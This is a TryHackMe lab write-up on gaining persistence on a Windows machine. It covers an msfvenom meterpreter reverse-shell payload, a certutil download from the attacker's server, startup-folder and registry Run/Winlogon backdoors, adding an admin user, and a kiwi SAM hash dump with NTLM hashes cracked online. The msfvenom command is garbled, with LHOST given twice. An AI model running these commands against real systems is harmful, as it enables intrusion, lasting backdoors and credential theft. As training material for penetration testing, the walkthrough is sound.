# TryHackMe-Persistance

>Abdullah Rizwan | 3:06 PM | 3rd November 2020

## ﻿What is persistence?

Persistence is a post-exploitation activity used by penetration testers in order to keep access to a system throughout the whole assessment and not to have to re-exploit the target even if the system restarts.

It can be considered that there are two types of persistence. These two types are:

    Low privileged persistence
    Privileged user persistence


### Low privileged user persistence

Low privileged persistence means that the penetration tester gained and uses persistence techniques to keep his access to the target system under a normal user profile/account (a domain user with no administrative rights).


### Privileged user persistence

After gaining access to a system, sometimes (because it would be inaccurate to say always), a penetration tester will do privilege escalation in order to gain access to the highest privilege user that can be on a Windows machine (nt authority\system).

After privilege escalation, he will use persistence in order to keep the access he gained.


Keeping persistence

Ways of keeping persistence:

    Startup folder persistence
    Editing registry keys
    Using scheduled tasks
    Using BITS
    Creating a backdoored service
    Creating another user
    Backdooring RDP


## RDP 

Access the machine through RDP (Remote Desktop Protocol) through the credentials given

```
tryhackme:tryhackme123
```


<img src="https://imgur.com/C4ygsY5.png"/>

Then click on `Save and Connect`


<img src="https://imgur.com/hIiAApg.png"/>

## Msfvenom 

Now create a backdoor through `msfvenom` and use `metasploit` to set a listener on to the port that the backdoor is set 

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.14.3.143 LHOST=6666 -f exe > backdoor.exe
```
<img src="https://imgur.com/0pvMA5U.png"/>

## Metasploit

<img src="https://imgur.com/yf8xl4Y.png"/>

Now host the backdoor on your machine

`python3 -m http.server 80`

And run this on target machine on `cmd` 

`certutil.exe -urlcache -f http://10.14.3.143:80/backdoor.exe backdoor.exe`

<img src="https://imgur.com/WHGRLa6.png"/>

But I didn't get saved on  the target machine so I tried to save it on it's home directory and it worked now start listening on metasploit and execute the backdoor on our target machine


But it didn't get worked , so now let's generate another backdoor but instead of specifiying architecture leave it 


<img src="https://imgur.com/rgQvRda.png"/>


<img src="https://imgur.com/bAgctSI.png"/>

Now this worked !

<img src="https://imgur.com/Hm8xYhj.png"/>


### Startup folder persistence

Now we can upload a backdoor that will be executed whenever the system starts up to do that we navigate to

`C:\Users\tryhackme\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` and here upload that backdoor

<img src="https://imgur.com/PIJtzlj.png"/>

<img src="https://imgur.com/Wg0PUa6.png"/>

Every time a user restarts its computer and logs in the backdoor will be executed and Metasploit will receive the connection.


### Editing registries

A low privileged user can still edit registries entries in a system , entry that can be edited is 

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```
On meterpreter shell type `shell` to get a windows cmd and then type this command

`reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\tryhackme\AppData\Roaming\backdoor.exe`

<img src="https://imgur.com/AmiciiN.png"/>



### Having Administrator Rights

By having high privilege rights we can add another admin user

`net user /add <USER> <PASSWORD>`

This will just a user to add that user in `Administrator` group

`net localgroup Administrators <USER> /add`

### Editing registries

We can also get persistance through adding a registry , when a user logs on to a system `Backdoor` can be invoked

`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <PATH_TO_BINARY>" /f`

### Hash Dump

Hash dumping will not run unless you are administrator so let's switch to admin 

`Administrator:Tryhackme123!`

<img src="https://imgur.com/JXNCzh5.png"/>

Now , run `getsystem` and `load kiwi` then run `lsa_dump_sam`

<img src="https://imgur.com/vXOvdMQ.png"/>  


```
Domain : PERSISTENCE                 
SysKey : 31066436b67d1dfb03c9f249b9aed099                                                                                                           
Local SID : S-1-5-21-3421978194-83625553-4099171136                       

SAMKey : d0bb192867888f2d94bc148c442c6c7c                                 

RID  : 000001f4 (500)                
User : Administrator                 
  Hash NTLM: 52745740e9a05e6195731194f03865ea                             

RID  : 000001f5 (501)                
User : Guest                         

RID  : 000001f7 (503)                
User : DefaultAccount                

RID  : 000003e8 (1000)               
User : joe                           
  Hash NTLM: 878d8014606cda29677a44efa1353fc7                             

RID  : 000003e9 (1001)               
User : chris                         
  Hash NTLM: e0b6050c7280bf4a7bee599cf374fd80                             

RID  : 000003ea (1002)               
User : tryhackme                     
  Hash NTLM: 0c7ba4684821cd349e327896d9db4474   
```

Now let's crack `joe`'s and `chris`'s password hashes


#### Chris

<img src="https://imgur.com/XEGhHF2.png"/>

#### Joe

<img src="https://imgur.com/1hjFwTH.png"/>

I used online crackstation to crack these hashes  however they can still be cracked by using `crackstation`'s wordlists or using `seclist` to crack them using `hashcat` or `johntheripper`

